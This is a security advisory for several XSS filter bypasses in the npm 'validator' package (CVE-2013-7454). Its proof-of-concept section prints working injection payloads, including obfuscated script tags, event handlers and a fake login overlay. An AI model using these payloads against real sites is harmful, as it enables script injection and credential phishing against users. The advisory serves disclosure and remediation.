# [M] Multiple XSS Filter Bypasses in validator

## Summary
Severity: Medium
Advisory: GHSA-q4qq-fm7q-cwp5
CVE: CVE-2013-7454
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2017-10-24
Source: https://github.com/advisories/GHSA-q4qq-fm7q-cwp5
Type: github-advisory

## Affected
- npm: `validator` — affected >=0 <1.1.0

## Details
Versions of `validator` prior to 1.1.0 are affected by several cross-site scripting vulnerabilities due to bypasses discovered in the blacklist-based filter.


## Proof of Concept
Various inputs that could bypass the filter were discovered:

Improper parsing of nested tags:

```
<s <onmouseover="alert(1)"> <;s onmouseover="alert(1)">This is a test</s>
```

Incomplete filtering of javascript: URIs:

```
<a href="javascriptJ a V a S c R iPt::alert(1)" "<s>">test</a>
```

UI Redressing:

```
<div style="z-index: 9999999; background-color: green; width: 100%; height: 100%">
<h1>You have won</h1>Please click the link and enter your login details:
<a href="http://example.com/">http://good.com</a>
</div>
```

Bypass via Nested Forbidden Strings:

```
<scrRedirecRedirect 302t 302ipt type="text/javascript">prompt(1);</scrRedirecRedirect 302t 302ipt>
```

Additional bypasses were discovered by Krzysztof Kotowicz in 2012 when auditing CodeIgniter's XSS filtering function, which this code was based off of.


## Recommendation

If you are a developer currently using the xss filter function from the validator package, you should consider replacing it with the escape filter function from the same package. This function replaces all instances of angle brackets (<, >), ampersands, and quotation marks, so no HTML tags will be processed.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2013-7454
- https://github.com/advisories/GHSA-q4qq-fm7q-cwp5
- https://nealpoole.com/blog/2013/07/xss-filter-bypass-in-validator-nodejs-module
- https://www.npmjs.com/advisories/41
- http://blog.kotowicz.net/2012/07/codeigniter-210-xssclean-cross-site.html
- http://www.openwall.com/lists/oss-security/2016/04/20/11
